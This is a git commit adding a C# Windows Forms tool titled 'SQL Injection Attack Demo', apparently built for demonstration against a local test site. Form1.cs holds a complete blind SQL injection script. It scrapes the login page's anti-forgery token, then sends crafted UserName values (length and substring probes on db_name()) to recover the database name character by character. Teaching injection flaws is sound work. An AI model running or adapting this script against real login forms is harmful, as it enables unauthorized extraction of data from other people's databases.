1d80b6c13870331b61a216a6e90e0bb7476aef2d
David Betteridge <DavidaBetteridge@gmail.com>
2018-05-16 13:45:14 +0100

    Initial

---
+++ Form1.Designer.cs
@@ -0,0 +1,112 @@
+﻿namespace InjectionAttackGUI
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.label1 = new System.Windows.Forms.Label();
+            this.txtURL = new System.Windows.Forms.TextBox();
+            this.cmdGO = new System.Windows.Forms.Button();
+            this.lblResult = new System.Windows.Forms.Label();
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 16.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.Location = new System.Drawing.Point(24, 24);
+            this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(144, 26);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "URL to attack";
+            // 
+            // txtURL
+            // 
+            this.txtURL.Font = new System.Drawing.Font("Microsoft Sans Serif", 16.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txtURL.Location = new System.Drawing.Point(170, 21);
+            this.txtURL.Margin = new System.Windows.Forms.Padding(2);
+            this.txtURL.Name = "txtURL";
+            this.txtURL.Size = new System.Drawing.Size(529, 32);
+            this.txtURL.TabIndex = 1;
+            this.txtURL.Text = "https://localhost:44357";
+            // 
+            // cmdGO
+            // 
+            this.cmdGO.Font = new System.Drawing.Font("Microsoft Sans Serif", 16.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.cmdGO.Location = new System.Drawing.Point(290, 68);
+            this.cmdGO.Margin = new System.Windows.Forms.Padding(2);
+            this.cmdGO.Name = "cmdGO";
+            this.cmdGO.Size = new System.Drawing.Size(126, 50);
+            this.cmdGO.TabIndex = 4;
+            this.cmdGO.Text = "Attack";
+            this.cmdGO.UseVisualStyleBackColor = true;
+            this.cmdGO.Click += new System.EventHandler(this.cmdGO_Click);
+            // 
+            // lblResult
+            // 
+            this.lblResult.BackColor = System.Drawing.SystemColors.Info;
+            this.lblResult.Font = new System.Drawing.Font("Microsoft Sans Serif", 22.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblResult.Location = new System.Drawing.Point(9, 142);
+            this.lblResult.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
+            this.lblResult.Name = "lblResult";
+            this.lblResult.Size = new System.Drawing.Size(690, 58);
+            this.lblResult.TabIndex = 5;
+            this.lblResult.Text = "Solution";
+            this.lblResult.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(725, 221);
+            this.Controls.Add(this.lblResult);
+            this.Controls.Add(this.cmdGO);
+            this.Controls.Add(this.txtURL);
+            this.Controls.Add(this.label1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Margin = new System.Windows.Forms.Padding(2);
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "SQL Injection Attack Demo";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.TextBox txtURL;
+        private System.Windows.Forms.Button cmdGO;
+        private System.Windows.Forms.Label lblResult;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,123 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Net;
+using System.Net.Http;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace InjectionAttackGUI
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            lblResult.Text = "";
+        }
+
+        private async void cmdGO_Click(object sender, EventArgs e)
+        {
+            string url = txtURL.Text;
+
+            var cookies = new CookieContainer();
+            var handler = new HttpClientHandler
+            {
+                CookieContainer = cookies,
+                UseCookies = true,
+                UseDefaultCredentials = false
+            };
+
+            var httpClient = new HttpClient(handler);
+            httpClient.BaseAddress = new Uri(url);
+
+
+            var token = await GetTokens(httpClient);
+
+            // First try and work out the length
+            bool solved = false;
+            int length = 1;
+            while (!solved)
+            {
+                this.lblResult.Text = "".PadLeft(length, '_');
+                this.Refresh();
+
+                string attack = "' or len(db_name()) = " + length + "--";
+                if (await TryString(attack, httpClient, token))
+                    solved = true;
+                else
+                    length++;
+            }
+
+
+            // Now try and solve each letter in turn
+            string solution = string.Empty;
+            var toTry = "0123456789abcdefghijklmnopqrstuvwxyz";
+            for (int i = 0; i < length; i++)
+            {
+                token = await GetTokens(httpClient);
+
+                foreach (var letterToTry in toTry)
+                {
+
+                    int letterToTryAsASCII = (int)letterToTry;
+                    this.lblResult.Text = (solution + letterToTry).PadRight(length, '_');
+                    this.Refresh();
+
+                    var attack = "' or substring(db_name()," + (i + 1) + ",1) = char(" + letterToTryAsASCII + ")--";
+
+
+                    if (await TryString(attack, httpClient, token))
+                    {
+                        solution = solution + letterToTry;
+                        break;
+                    }
+                }
+            }
+        }
+
+        private async Task<string> GetTokens(HttpClient httpClient)
+        {
+            var response = await httpClient.GetAsync("/Login");
+            response.EnsureSuccessStatusCode();
+
+            var html = await response.Content.ReadAsStringAsync();
+
+            var start = html.IndexOf("__RequestVerificationToken");
+            var value = html.IndexOf(@"value=""", start) + @"value=""".Length;
+            var end = html.IndexOf(@"""", value + 2);
+            var token = html.Substring(value, end - value);
+
+            return token;
+
+        }
+
+        private async Task<bool> TryString(string stringToTry, HttpClient httpClient, string token)
+        {
+
+            var nvc = new List<KeyValuePair<string, string>>();
+            nvc.Add(new KeyValuePair<string, string>("UserName", stringToTry));
+            nvc.Add(new KeyValuePair<string, string>("Password", "a"));
+            nvc.Add(new KeyValuePair<string, string>("RememberMe", "false"));
+            nvc.Add(new KeyValuePair<string, string>("__RequestVerificationToken", token));
+
+            var req = new HttpRequestMessage(HttpMethod.Post, "/Login?Handler=login") { Content = new FormUrlEncodedContent(nvc) };
+
+            var response = await httpClient.SendAsync(req);
+            if (response.IsSuccessStatusCode)
+            {
+                var content = await response.Content.ReadAsStringAsync();
+
+                return !content.Contains("Either your");
+            }
+            else
+            {
+                return false;
+            }
+
+        }
+    }
+}
